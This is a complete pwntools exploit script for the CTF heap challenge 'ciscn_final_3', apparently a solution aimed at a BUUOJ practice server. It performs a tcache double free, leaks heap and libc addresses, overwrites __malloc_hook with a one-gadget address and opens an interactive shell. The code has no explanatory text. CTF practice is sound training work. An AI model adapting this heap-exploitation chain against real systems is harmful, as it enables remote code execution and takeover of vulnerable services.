#!/usr/bin/env python
# coding=utf-8
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'

local = 0
if local == 1:
    r=process('./ciscn_final_3')
    
    #gdb.attach(r,'b * $rebase(0xbc9)')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r=remote('node4.buuoj.cn',26202)
    libc = ELF('./libc.so.6')

elf = ELF('./ciscn_final_3')

def add(num,size,content):
    r.recvuntil('choice >')
    r.sendline('1')
    r.recvuntil('index')
    r.sendline(str(num))
    r.recvuntil('size')
    r.sendline(str(size))
    r.recvuntil("something")
    r.send(content)

def dele(num):
    r.recvuntil('choice >')
    r.sendline('2')
    r.recvuntil('index')
    r.sendline(str(num))

add(0,0x48,'a'*0x20)
r.recvuntil('gift :')
heap = int(r.recv(14),16)
log.success('heap:'+hex(heap))
add(1,0x78,'b'*0x20)
add(2,0x78,'b'*0x20)
add(3,0x78,'b'*0x20)
add(4,0x78,'b'*0x20)
add(5,0x78,'b'*0x20)
add(6,0x78,'b'*0x20)
add(7,0x78,'b'*0x20)
add(8,0x78,'b'*0x20)
add(9,0x78,'b'*0x20)

add(12,0x78,p64(0)*3+p64(0x61))
dele(1)
dele(1)
add(15,0x78,p64(heap+0x50+0x50))

#gdb.attach(r,'b * libc_malloc +523')


add(10,0x78,'cccccccc'*4+p64(0)*6+p64(heap+0x80+0x50))
add(11,0x78,'dddddddd'*3+p64(0)*2+p64(0x421))
dele(2)

add(13,0x78,'d'*0x20)

add(14,0x78,'e'*0x20)

r.recvuntil('gift :')
malloc_hook = int(r.recv(14),16)-0x70
log.success('malloc_hook:'+hex(malloc_hook))
dele(0)
dele(0)
libc_addr = malloc_hook - libc.symbols['__malloc_hook']

one = libc_addr + 0x10a38c

add(16,0x48,p64(malloc_hook))
add(17,0x48,'f'*0x20)
add(18,0x48,p64(one)+cyclic(64))


r.recvuntil('choice >')
r.sendline('1')
r.recvuntil('index')
r.sendline('19')
r.recvuntil('size')
r.sendline('0x48')

"""

"""

#

#add(15,0x5,p64(malloc_hook-0x30))


r.interactive()
